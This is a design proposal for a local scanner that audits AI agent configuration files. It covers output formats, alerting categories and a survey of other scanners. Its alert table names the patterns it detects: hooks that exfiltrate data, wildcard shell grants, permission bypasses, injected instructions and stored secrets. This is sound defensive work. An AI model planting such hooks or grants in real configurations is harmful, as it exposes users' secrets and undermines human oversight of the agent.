**Proposal — one new subcommand, three formats:**

```
llmsnitch scan [ROOT ...] [--format text|json|sarif] [--fail-on critical|high|medium]
               [--inventory] [--rebaseline] [--out FILE]
```

- **Exit codes reuse the gate contract** (`gate.py:18`): 0 = no finding at
  or above `--fail-on` (default `high`); 1 = breach; 2 = operational
  (unreadable root, no permissions). This makes `scan` CI-able and
  cron-able exactly like `check`.
- **text** (default): summary block in the same terse style as
  `cmd_check` output (`cli.py:109-119`) — counts by severity, then one
  line per finding ≥ medium.
- **json**: `meta.json` + findings array verbatim.
- **sarif**: SARIF 2.1.0, modeled on the one complete real-world emitter
  surveyed — Cisco's `core/reporters/sarif_reporter.py`: version + schema
  URI constants (`:35-36`), severity→level map critical/high→`error`,
  medium→`warning`, low/info→`note` (`:39-46`), `tool.driver.rules` from
  the inline ruleset (`:131-179`), results with
  `physicalLocation.artifactLocation.uri` + `region.startLine` + snippet
  (`:229-246`), and our `fingerprint` in
  `fingerprints.primaryLocationLineHash` (`:250-253`). Ramparts'
  `src/sarif.rs:18-20,36-110` is the second reference. ~120 lines of
  `json.dumps` — no dependency.
- `list`/`show`/`check` stay untouched in MVP. (A `scan` line inside
  `show` is a one-line follow-up, not MVP.)

## 2.5 Notifications

Scan findings enter the notify layer as a new surface — the notifier spec
explicitly reserves the slot: "*(future)* any new watcher calls the same
API" (`docs/notifier-spec.md` §Scope). Surface id: `config-audit`, config
section `[notify.config-audit]`.

**Edge discipline first**: a scan re-run must not re-page known findings.
Before calling `notify()`, the scan diffs its fingerprints against the
previous scan's `findings.ndjson` (no new state — the last scan dir is the
baseline, the same trick as skill-detector's `pkg/delta/` two-result diff,
`delta.go:12-24`). Only **new** fingerprints call `notify()` normally;
persisting findings are ledgered with `record_only=True` (ledger row, no
banner — spec §`record_only` semantics); resolved findings are
`record_only` recoveries. This is the scan-layer equivalent of
`edge_alert`'s transition certification.

Categories (added to the spec's enum on the same terms — code-defined,
config-tunable):

| Category | Fires when | Severity | Window | Decision the page names |
|---|---|---|---|---|
| `config_compromise` | Compromise-class rule hits a control surface (hook exfil shape, wildcard Bash grant, `bypassPermissions`, injected instruction in settings/hooks) | critical | 24h | quarantine: revert/remove the flagged block before the next agent session; check the fs-coil ledger for what wrote it; revoke anything it exfiltrated |
| `secret_at_rest` | Secret shape found in a discovered artifact | high | 24h | rotate the named credential; delete it from the file |
| `config_drift` | Baseline hash changed on a control surface (settings/hooks/MCP config) | high | 24h | diff the artifact; `scan --rebaseline` if you made the change, revert if not |
| `scan_hygiene` | Everything else (vague triggers, missing pins, drift on non-control files) | low | 24h | none — digest only |

Actionability gates, stated per paging category:

- **Decision** — named in the table above; `scan_hygiene` honestly names
  none, so it never pages (`record_only` semantics, digest recall via
  the ledger).
- **Actor** — a batch scan cannot name the writing process; it names the
  **agent territory** (`agent` field → actor bucket), which is exactly the
  light-mode ceiling the spec already documents ("light mode attributes
  territory, not actors"). Where fs-coil deep mode logged a `deny_write`
  on the same path, the page's message links the two (`investigate:
  fs-coil noise --category deny_write`). A finding outside any territory
  buckets to `unknown` — still an answer ("nobody registered owns this
  file"), per the mismatch doctrine.
- **Novelty** — novelty tuple stays `(category, actor_bucket)` per the
  spec; the per-finding dedup happens *upstream* via the fingerprint diff,
  so the tuple window only rate-limits pages when many new findings land
  in one territory at once (one page + "N more in ledger", the digest
  carries the rest).

Severity mapping from surveyed scanners (CRITICAL/HIGH/MEDIUM/LOW/INFO —
Cisco `core/models.py:28-36`, MEDUSA `scanners/base.py:19-25`, vetix
`plugin.py:13-18`) collapses to the notifier's three effective tiers:
critical → pages through cold start; high → pages after cold start;
medium/low/info → `scan_hygiene`, digest only. Cold start (spec D23) is
inherited unchanged: a first-day `secret_at_rest` lands in ledger +
digest, not Notification Center; `config_compromise` is critical and
pierces — same rule as actor-mismatch.

## 2.6 Dashboards

**What "dashboard" means upstream:** CCO's dashboard is a genuine local
web app — `node:http` server (`src/server.mjs:7`) serving an SPA with a
scope tree, a security-scan button with a findings badge
(`src/ui/index.html:25-28`), and per-session cost panels (`:76-82`). That
shape is disqualified twice over: llmsnitch has no daemon and no server
(`README.md:21-23`), and the notifier spec's out-of-scope list already
bars "any GUI dashboard beyond the existing `fs-coil dashboard` TUI".
MEDUSA's HTML report is the acceptable *shape* — a static, self-contained
f-string file with an SVG donut score ring, severity grid, scanner table,
and finding cards, no JS charting, no CDN fetch
(`core/reporter.py:563-1152,1070-1082`) — and huifer shows the trap to
avoid (its HTML reporter defaults to CDN assets,
`src/reporters/html_report.py:12`).

**MVP verdict: no HTML artifact at all.** The dashboard *is*:

1. the `llmsnitch scan` terminal summary (§2.4), and
2. the notifier outlets the spec already builds: scan findings ledger into
   the cold trail, so they appear in the daily digest (§Delivery outlets
   3) and the `fs-coil dashboard` notify pane / `status` degraded row
   (§Delivery outlets 4) with zero new rendering code.

Honestly out of scope: live/auto-refreshing views of scan results, HTML
files of any kind, charts. If a static HTML report is ever wanted, it must
be an independent design (MEDUSA is AGPL) written like MEDUSA *behaves*
(single file, inline SVG, no CDN) — phase 2 at the earliest, and only if
the digest proves insufficient.

---

# Part 3 — Cut list (explicitly out of MVP)

- **YARA engine / rule-file loading** — 40 of Ramparts' and 18 of Cisco's
  detections; inline Python regexes cover the portable subset, and
  rules-as-data caused Ramparts' fail-open (`scanner.rs:73-78`).
- **LLM adjudication of any kind** — Cisco/vetix/clawscan/harness judges;
  network + nondeterminism, both barred.
- **Live MCP scanning** (`initialize`/`tools/list` over the wire, Ramparts
  `mcp_client.rs:773+`) — network by definition; we scan configs at rest.
- **OSV / VirusTotal / AI-Defense / registry queries** (Ramparts
  `osv.rs:28`; Cisco `analyzer_factory.py:83-216`; ai-trust wholesale) —
  network.
- **Trust-score axes/grades** (skill-detector) — its own quality axis has
  zero rules and its grade is a cap-table lookup, not math; llmsnitch keeps
  plain severity. `--fail-on` gives the same CI ergonomics as
  `--fail-on-axis` without the grade fiction.
- **Transcript/chat-history secret sweep** (MEDUSA `medusa secrets`) —
  different product; llmsnitch redacts its own trail at capture. Phase 2
  candidate at most.
- **Retroactive redact of existing trails** (PORT_INDEX rank 2 item) —
  real, but orthogonal to scanning; separate ticket.
- **Archive/PDF/OLE extraction, homoglyph confusables, magika typing**
  (Cisco extractors) — dependency-shaped; NUL-sniff + size caps suffice.
- **Base64/hex iterative peel and leetspeak normalization** (Ramparts
  `normalize.rs:183-208`, CCO `security-scanner.mjs:479-495`) — already
  rejected for the hot path in the unicode note §6; not worth cold-path
  complexity in v1 either.
- **Delta subcommand** (skill-detector `pkg/delta/`) — folded into the
  notifier edge discipline (§2.5); a user-facing `scan --diff` can come
  later.
- **HTML/Markdown report emitters, pre-commit hook, per-OS 36-row path
  table, `atr`-scale rule packs (712 rules), watch mode** — all deferred;
  MVP is the smallest coherent set above.

# Part 4 — Contradictions / corrections to PORT_INDEX.md and dossiers

Primary sources win; each item names the wrong claim and the evidence.

1. **Ramparts fingerprint store has no timestamp.** Dossier claimed
   `(file_path, sha256, first_seen_ts)`; actual store is a flat
   `HashMap<String,String>` of `namespace\x1f key → sha256`
   (`src/baseline.rs:27-43,61-71`). Our §2.1(5) adds `first_seen_ts` as a
   declared deviation, not parity.
2. **Ramparts rules are not embedded in the binary** and are excluded from
   the published crate (`Cargo.toml:19`), with a documented fail-open
   history (`scanner.rs:73-78`) — absent from PORT_INDEX; it's the
   strongest single design lesson in the tree (ship rules inline).
3. **"Port the YARA rules" undercounts Ramparts** — ~18 detections are
   Rust heuristics with no YARA representation (`src/skills.rs`).
4. **skill-detector has no weights, no overall score, and no SARIF.**
   Grade = worst-finding cap-table lookup (`grade.go:43-49`,
   `templates.go:11-40`); formats are text/json only (`main.go:184`).
   PORT_INDEX rank 3's "4-axis Trust Score" reads like a scoring rollup;
   it isn't. Also its `quality` axis has **zero rules** and is suppressed
   in output (`text.go:114-122`) — porting the axes verbatim ships an axis
   that cannot fail.
5. **skill-detector never parses SKILL.md frontmatter** — `SKILL.md` is a
   basename gate (`fileclass.go:115-118`); and it does **not** detect
   `bypassPermissions` (grep-verified negative).
6. **Cisco has no `Bash(*)` overbroad-grant check.** Our dossier claimed
   it; zero hits for `Bash(` in its py/yaml. The real check is the
   inverse — code capability exceeding the declared `allowed-tools`
   allowlist (`static.py:1502-1620`, `allowed_tools_checks.py:117-218`).
   The wildcard-grant check the MVP wants comes from skill-detector SD-017
   (`settings_json.go:130-157`) instead.
7. **MEDUSA "21 issuer types"** → 21 patterns across **17** issuers
   (`core/secret_patterns.py:40-249`). Its SARIF emitter is dead code from
   the CLI (`cli.py:1291-1292`). Its `.claude/` compromise checks are fully
   corroborated (`hooks_exfiltration_2026.yaml`). The dossier's rejection
   of its "LLM-context scoring" as network egress was wrong-rationale:
   `get_confidence_score` is pure local regex (`scanners/base.py:276-298`)
   — right rejection (AGPL + redundancy), wrong reason.
8. **CCO's "140+ hidden config paths" is CCO's own marketing sentence**,
   echoed by our dossier (`mcpware-cross-code-organizer/AGENTS.md:6`). The
   source has exactly **two** harness adapters (claude, codex —
   `src/harness/adapters/`) and no 140-path table. The real harvestable
   seed list is scanner.mjs's `.claude` scopes + codex.mjs's ~15 sources +
   **snyk's 36-row per-OS `CandidateClient` table**, which is the better
   citation for the enrolment-list port.
9. **CCO's undersold scanner**: PORT_INDEX lists CCO only for the
   watchlist + adapter shape; the source also carries a 58-rule pattern
   scan, Unicode deobfuscation, and hash baselining
   (`src/security-scanner.mjs:37-60,156-264,560+`) — MIT-licensed
   corroboration for MVP scan types 2, 3, and 5.
10. **clawscan rejection verified, minus one nugget**: composition via
    Docker + 9 external scanners + LLM judge is confirmed
    (`schemas/clawscan.schema.json:71-83`, `internal/runner/sandbox.go`),
    but `internal/runner/static_scanner.go` is a self-contained 8-rule
    MIT scanner whose evidence-cap and per-file-hash disciplines the MVP
    adopts (§2.3).
11. **tencent-ai-infra-guard rejection verified and sharpened**: its rule
    "data" is LLM prompt templates (`data/mcp/*.yaml` `prompt_template:`
    key) and remote HTTP fingerprints (`data/fingerprints/`, 145 files) —
    not merely "scope mismatch" but *categorically* non-portable under
    no-network/no-LLM.
12. **ai-trust rejection verified with a nuance**: there is local verdict
    logic (`src/output/score-aware-verdict.ts:1-40`), but it consumes
    registry scores from `https://api.oa2a.org` (`src/index.ts:31`) and
    an external npm scanner — nothing salvageable stands alone.
13. **secopsagentkit taxonomy is seven categories, not five**: PORT_INDEX
    says "AppSec / DevSecOps / SecSDLC / Compliance / IR"; source adds
    `threatmodel` and `offsec` (`scripts/validate_skill.py:27-35`).
14. **vbsec's L1–L4 is a taint vocabulary for an LLM reviewer**
    (`references/data-flow-classification.md:1-14`), not a runtime trust
    structure — fine as an optional cold-trail annotation someday, but it
    labels *data-flow sources in reviewed code*, not llmsnitch events;
    the PORT_INDEX "optional field on cold-trail events" idea doesn't
    survive contact with what L1–L4 actually classifies. The "one finding,
    one rule" phrase appears nowhere in the vbsec tree (its output format
    does bind each finding block to a single rule file —
    `references/output-format.md:6-17` — so the *invariant* is real, the
    *quote* is ours).
